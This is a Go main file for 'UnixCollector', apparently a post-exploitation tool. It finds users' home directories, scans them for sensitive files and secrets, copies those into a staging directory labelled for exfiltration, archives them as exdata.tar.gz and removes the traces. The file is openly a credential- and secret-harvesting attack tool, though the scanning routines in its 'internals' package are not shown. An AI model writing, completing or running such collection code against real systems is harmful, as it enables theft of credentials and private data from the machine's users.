package main

import (
	"UnixCollector/internals"
	"fmt"
)

func main() {
	fmt.Println("[+] UnixCollector started")

	usersHome, isRoot := internals.GetUsersHomedir()
	exfilDirectory := internals.GetExfilDirectory()

	secrets := internals.ScanSensitiveFiles(exfilDirectory, usersHome, isRoot)
	accessibleFiles := internals.FilterExistingFiles(secrets)
	internals.CopyFiles(accessibleFiles, exfilDirectory)

	err := internals.TarGzipDirectory(exfilDirectory)
	if err != nil {
		fmt.Println("[!] Error creating archive of:", exfilDirectory)
		fmt.Println("\tError Returned:", err)
	} else {
		fmt.Println("[+] Successfully Collected:", len(accessibleFiles), "files")
	}
	err = internals.RemoveRecursive(exfilDirectory)
	if err != nil {
		fmt.Println("[!] Error removing exfil directory", exfilDirectory, "manually remove")
		fmt.Println("\tError Returned:", err)
	} else {
		fmt.Println("[+] See exdata.tar.gz in your pwd")
	}
}
